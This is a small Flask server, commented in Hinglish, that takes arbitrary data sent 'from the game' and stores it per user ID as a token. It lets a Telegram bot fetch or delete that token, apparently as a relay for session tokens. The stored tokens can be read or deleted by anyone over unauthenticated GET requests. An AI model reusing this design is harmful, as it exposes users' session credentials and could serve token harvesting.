from flask import Flask, jsonify, request

app = Flask(__name__)

# Data store karne ke liye dictionary
tokens_db = {}


@app.route("/")
def home():
  return "Flask Server is Running Successfully!"


# Game se data capture karne ka route (<user_id> ke sath)
@app.route("/<user_id>/", methods=["GET", "POST"])
def capture_data(user_id):
  data = request.json or request.args.to_dict() or request.form.to_dict()
  tokens_db[user_id] = data
  return jsonify({"status": "success", "message": "Data saved successfully"})


# Telegram bot ke liye token fetch karne ka route
@app.route("/get_token/<user_id>", methods=["GET"])
def get_token(user_id):
  if user_id in tokens_db:
    return jsonify({"status": "success", "data": tokens_db[user_id]})
  else:
    return jsonify({"status": "error", "message": "No token found"}), 404


# Token delete karne ka route
@app.route("/delete_token/<user_id>", methods=["GET"])
def delete_token(user_id):
  if user_id in tokens_db:
    del tokens_db[user_id]
  return jsonify({"status": "success", "message": "Token deleted"})


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=10000)
  
